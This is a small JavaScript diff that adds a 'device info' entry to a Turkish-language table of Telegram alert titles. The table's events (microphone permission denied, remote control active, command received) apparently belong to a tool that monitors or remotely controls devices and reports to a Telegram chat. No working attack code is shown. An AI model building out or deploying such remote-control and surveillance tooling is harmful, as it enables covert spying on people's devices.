@@ -87,7 +87,8 @@ function formatTelegramMessage(logData, ip) {
         'microphone_permission_denied': '🚫 MİKROFON İZNİ REDDEDİLDİ',
         'remote_control_started': '🎮 CİHAZ BAĞLANDI - UZAKTAN KONTROL AKTİF',
         'command_received': '📡 KOMUT ALINDI',
-        'command_error': '⚠️ KOMUT HATASI'
+        'command_error': '⚠️ KOMUT HATASI',
+        'device_info': '📱 AKTİF CİHAZ BİLGİSİ'
     };
 
     const title = eventIcons[event_type] || '🔔 YENİ OLAY';
